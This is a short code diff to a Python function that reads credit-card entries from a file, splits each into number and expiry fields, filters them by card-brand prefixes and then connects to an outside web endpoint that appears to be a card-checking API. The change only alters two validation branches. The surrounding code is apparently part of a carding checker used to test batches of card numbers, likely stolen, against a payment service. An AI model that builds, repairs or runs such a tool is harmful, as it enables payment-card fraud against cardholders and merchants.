@@ -10,7 +10,7 @@ async def process_credit_card(cc_entry, message):
         x = re.findall(r'\d+', cc_entry)
         if len(x) != 4:
             print(f'Invalid CC format in file: {cc_entry}')
-            continue
+            return
         
         ccn = x[0]
         mm = x[1]
@@ -20,7 +20,7 @@ async def process_credit_card(cc_entry, message):
         VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
         if not ccn.startswith(VALID):
             print(f'Invalid CC type in file: {cc_entry}')
-            continue
+            return
 
         async with aiohttp.ClientSession() as session:
             url = "https://mvy.ai/sk_api/api.php"
